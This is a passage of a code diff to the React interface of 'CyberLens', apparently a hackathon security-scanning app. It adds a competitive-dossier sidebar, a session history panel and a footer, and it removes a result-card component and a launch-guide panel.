+            )}
+          </section>
+
+          {/* Right Column: Hackathon Judge Brief & Competitive Dossier */}
+          <aside className="judge-dossier-sidecar" aria-label="Competitive Dossier">
+            <div className="dossier-card">
+              <div className="dossier-card-head">
+                <h3>Competitive Dossier</h3>
+                <span className="advantage-badge">PROMPTWARS ADVANTAGE</span>
+              </div>
+
+              <p className="dossier-prose">
+                Why CyberLens triumphs: 95% of hackathon AI tools are fragile external LLM wrappers that crash without connectivity.
+                CyberLens is an enterprise dual-engine cyber co-pilot that guarantees 100% demo resilience.
+              </p>
+
+              <div className="matrix-list">
+                {guideSteps.map(([num, title, desc]) => (
+                  <div key={num} className="matrix-row">
+                    <span className="matrix-check">✓</span>
+                    <div className="matrix-content">
+                      <strong>{title}</strong>
+                      <p>{desc}</p>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            </div>
+
+            {/* Local Ephemeral Vault History */}
+            <div className="vault-card">
+              <div className="vault-head">
+                <h4>Recent Forensic Sessions</h4>
+                {history.length > 0 && (
+                  <button
+                    className="vault-clear-btn"
+                    onClick={() => {
+                      audio.play('click')
+                      setHistory([])
+                    }}
+                  >
+                    Clear Vault
+                  </button>
+                )}
+              </div>
+
+              {history.length ? (
+                <div className="vault-items-stack">
+                  {history.map(item => (
+                    <div key={item.id} className={`vault-entry ${item.risk}`}>
+                      <div className="vault-entry-meta">
+                        <span>{item.type.toUpperCase()} • {item.risk.toUpperCase()}</span>
+                        <span>{item.at}</span>
+                      </div>
+                      <p className="vault-entry-summary">{item.summary}</p>
+                    </div>
+                  ))}
+                </div>
+              ) : (
+                <div className="vault-empty">
+                  <span>No sessions recorded on this device yet.</span>
+                </div>
+              )}
+            </div>
+          </aside>
+        </div>
       </main>
 
-      <Toast message={toastMsg} visible={toastVisible} />
+      {/* Draftsman Architectural Footer */}
+      <footer className="architect-footer">
+        <div className="footer-inner">
+          <span>CYBERLENS AI • PROMPTWARS HACKATHON EDITION</span>
+          <span>DETERMINISTIC HEURISTIC KERNEL + CO-PILOT ASSISTED</span>
+          <span>STRICT ZERO-RETENTION CERTIFIED</span>
+        </div>
+      </footer>
+
+      {/* Floating Toast Notification */}
+      <div className={`toast-bar ${toastVisible ? 'visible' : ''}`} role="status">
+        <span>✓</span>
+        <span>{toastMsg}</span>
+      </div>
     </div>
-  )
-}
-
-function AnalysisResult({ result, copied, onCopy }) {
-  const percent = Math.max(12, Math.min(96, result.confidence || 65))
-  const scanId = result.id ? String(result.id).slice(0, 8) : 'demo1234'
-
-  function handleCopyClick(e) {
-    // Ripple effect
-    const btn = e.currentTarget
-    const ripple = document.createElement('span')
-    ripple.className = 'ripple'
-    const rect = btn.getBoundingClientRect()
-    ripple.style.left = `${e.clientX - rect.left}px`
-    ripple.style.top = `${e.clientY - rect.top}px`
-    btn.appendChild(ripple)
-    setTimeout(() => ripple.remove(), 600)
-    onCopy()
-  }
-
-  return (
-    <article className="result-card" aria-live="polite">
-      <div className="result-top">
-        <div>
-          <span className="section-kicker">Analysis complete</span>
-          <h2>{result.risk === 'high' ? 'Potential threat detected' : result.risk === 'medium' ? 'Proceed with caution' : 'No immediate red flags'}</h2>
-        </div>
-        <div className="result-actions">
-          <span className="scan-id-badge">ID: {scanId}</span>
-          <span className={`source-label ${result.source === 'openai' ? 'model' : ''}`}>
-            <Icon name={result.source === 'openai' ? 'spark' : 'info'} size={13} />
-            {result.source === 'openai' ? 'AI-assisted' : 'Guided demo mode'}
-          </span>
-          <button aria-label="Copy analysis report" className="copy-button" onClick={handleCopyClick}>
-            {copied ? <Icon name="check" size={16} /> : <Icon name="copy" size={16} />}
-            {copied ? 'Copied' : 'Copy'}
-          </button>
-        </div>
-      </div>
-
-      <ThreatMeter risk={result.risk} confidence={percent} />
-      <ConfidenceBar percent={percent} risk={result.risk} />
-
-      <div className="result-grid">
-        <div className={`risk-orb ${result.risk}`} style={{ '--risk': `${percent * 3.6}deg` }}>
-          <span>{result.risk}</span>
-          <small>risk</small>
-        </div>
-        <div className="summary-block">
-          <RiskBadge risk={result.risk} />
-          <p>{result.summary}</p>
-          <span>Confidence: {percent}% · Treat this as guidance, not a final security verdict.</span>
-        </div>
-      </div>
-
-      <div className="findings">
-        <h3>Why this was flagged</h3>
-        {result.findings.map((finding, index) => (
-          <div className="finding" key={`${finding.title}-${index}`}>
-            <span className="finding-index">0{index + 1}</span>
-            <div><strong>{finding.title}</strong><p>{finding.detail}</p></div>
-          </div>
-        ))}
-      </div>
-
-      <div className="actions-list">
-        <div><Icon name="shield" size={17} /><strong>Safest next steps</strong></div>
-        <ol>{result.actions.map((action, index) => <li key={`${action}-${index}`}>{action}</li>)}</ol>
-      </div>
-    </article>
-  )
-}
-
-function GuidePanel() {
-  return (
-    <aside className="guide-panel" id="guide" aria-label="No-compromise launch guide">
-      <div className="guide-glow" aria-hidden="true" />
-      <div className="guide-header">
-        <span className="guide-icon"><Icon name="book" size={18} /></span>
-        <div>
-          <span className="section-kicker">Build it right</span>
-          <h2>Launch guide</h2>
-        </div>
-        <span className="guide-badge">No compromise</span>
-      </div>
-      <p className="guide-intro">The short path to a memorable hackathon product: ship the trustworthy core, then make it feel inevitable.</p>
-      <div className="guide-steps">
-        {guideSteps.map(([number, title, detail]) => (
-          <div className="guide-step" key={number}>
-            <span>{number}</span>
-            <div><h3>{title}</h3><p>{detail}</p></div>
-          </div>
-        ))}
-      </div>
-      <div className="guide-divider" />
-      <div className="launch-check">
-        <div><span className="section-kicker">Before you submit</span><h3>Non-negotiables</h3></div>
-        <ul>
-          <li><Icon name="check" size={15} />A real end-to-end demo</li>
-          <li><Icon name="check" size={15} />No secrets in the client or repo</li>
-          <li><Icon name="check" size={15} />Three rehearsed scenarios</li>
-          <li><Icon name="check" size={15} />Mobile and keyboard checked</li>
-        </ul>
-      </div>
-      <a className="guide-link" href="/launch-guide.md" target="_blank" rel="noreferrer">
-        Read the full execution guide <Icon name="arrow" size={16} />
-      </a>
-      <div className="guide-footer"><Icon name="spark" size={15} /><span>Great demos answer: "Why should I trust this?"</span></div>
-    </aside>
   )
 }
 
